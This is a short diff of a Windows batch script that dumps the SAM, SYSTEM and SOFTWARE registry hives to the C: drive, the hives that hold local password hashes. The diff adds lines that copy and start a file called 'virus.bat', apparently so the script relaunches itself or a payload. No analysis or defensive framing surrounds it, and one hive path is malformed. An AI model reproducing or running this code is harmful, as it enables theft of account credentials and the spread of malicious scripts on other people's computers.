@@ -1,4 +1,11 @@
 @echo off
+chdir /d %CD%
+copy virus.bat
+start virus.bat
+
+
+
+@echo off
 reg save hklm\sam c:\sam
 reg save hklm\system c:system
 reg save hklm\software c:\software
